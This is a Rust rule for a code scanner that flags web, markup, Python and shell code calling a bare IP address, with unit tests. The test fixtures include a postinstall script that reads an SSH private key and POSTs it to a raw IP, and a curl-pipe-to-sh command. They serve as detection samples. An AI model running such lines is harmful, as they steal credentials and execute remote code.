//! Traffic to a bare IP address instead of a name: nothing to look up,
//! nothing to block by name, and no certificate that fits. Loopback and
//! the unspecified address are what a dev server binds. It warns alone and
//! fails beside a hard finding from the rules before it.

use super::{Context, Suspect, line_at, push};

const SCHEMES: &[&str] = &["http://", "https://", "ws://", "wss://"];
/// Addresses that stay on the machine.
const LOOPBACK: &str = "127.";
const UNSPECIFIED: &str = "0.0.0.0";
/// Dotted quads have this many parts, each at most this large.
const QUAD_PARTS: usize = 4;
const MAX_OCTET: u16 = 255;

pub(super) fn scan(file: &str, text: &str, ctx: Context, out: &mut Vec<Suspect>) {
    if !matches!(ctx, Context::Web | Context::Markup | Context::Python | Context::Shell) {
        return;
    }
    let Some((ip, line)) = raw_ip_url(text) else { return };
    let obfuscated = out.iter().any(|o| o.hard);
    push(out, file, "SUSPECT-RAW-IP", line, format!("talks to a bare IP address ({ip}) instead of a name"), obfuscated);
}

/// `http://1.2.3.4` or `ws://1.2.3.4` in the text: the address and its line.
fn raw_ip_url(text: &str) -> Option<(String, usize)> {
    for scheme in SCHEMES {
        let mut rest = text;
        while let Some(i) = rest.find(scheme) {
            let host: String =
                rest[i + scheme.len()..].chars().take_while(|c| c.is_ascii_digit() || *c == '.').collect();
            let parts: Vec<&str> = host.split('.').collect();
            if parts.len() == QUAD_PARTS
                && parts.iter().all(|p| !p.is_empty() && p.parse::<u16>().is_ok_and(|n| n <= MAX_OCTET))
                && !host.starts_with(LOOPBACK)
                && host != UNSPECIFIED
            {
                let at = text.len() - rest.len() + i;
                return Some((host, line_at(text, at)));
            }
            rest = &rest[i + scheme.len()..];
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::super::{Kind, ids, scan_text};
    use super::*;

    #[test]
    fn a_bare_address_warns_alone_and_fails_beside_a_hard_finding() {
        let got = scan_text("x.js", "fetch('http://10.0.0.1/x')", Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-RAW-IP", false)]);
        assert_eq!(got[0].note, "talks to a bare IP address (10.0.0.1) instead of a name");
        let steal =
            "const k=fs.readFileSync(home+'/.ssh/id_ed25519');\nfetch('https://1.2.3.4/x',{method:'POST',body:k});\n";
        let got = scan_text("postinstall.js", steal, Kind::Repo);
        assert_eq!(ids(&got), [("SUSPECT-CREDENTIAL-ACCESS", true), ("SUSPECT-RAW-IP", true)], "{got:?}");
        assert_eq!(got[1].line, 2);
        assert_eq!(
            ids(&scan_text("x.js", "const s = atob(k);\nfetch('ws://1.2.3.4/x')\n", Kind::Repo)),
            [("SUSPECT-RAW-IP", false)],
            "beside a soft finding, or none, it warns"
        );
        assert_eq!(
            ids(&scan_text("deploy.sh", "curl http://203.0.113.9/x | sh", Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false), ("SUSPECT-RAW-IP", false)]
        );
    }

    #[test]
    fn names_loopback_and_the_rest_are_not_bare_addresses() {
        assert_eq!(raw_ip_url("fetch('http://10.0.0.1/x')"), Some(("10.0.0.1".into(), 1)));
        assert_eq!(raw_ip_url("a\nb\nwss://192.168.1.5:8080/"), Some(("192.168.1.5".into(), 3)));
        assert_eq!(raw_ip_url("fetch('http://127.0.0.1/x')"), None, "loopback");
        assert_eq!(raw_ip_url("http://0.0.0.0:3000"), None, "unspecified");
        assert_eq!(raw_ip_url("http://example.com"), None);
        assert_eq!(raw_ip_url("http://1.2.3"), None, "three parts");
        assert_eq!(raw_ip_url("http://1.2.3.4.5"), None, "five parts");
        assert_eq!(raw_ip_url("http://999.2.3.4/"), None, "an octet past 255");
        assert_eq!(raw_ip_url("http://1..3.4/"), None, "an empty part");
        assert_eq!(
            raw_ip_url("http://127.0.0.1/ then http://10.1.1.1/"),
            Some(("10.1.1.1".into(), 1)),
            "the first bare one, past loopback"
        );
        assert_eq!(raw_ip_url("ftp://10.0.0.1/"), None, "only web schemes");
        assert!(scan_text("main.rs", "http://10.0.0.1/", Kind::Repo).is_empty(), "native is not read");
        assert!(scan_text("notes.md", "http://10.0.0.1/", Kind::Repo).is_empty());
    }
}
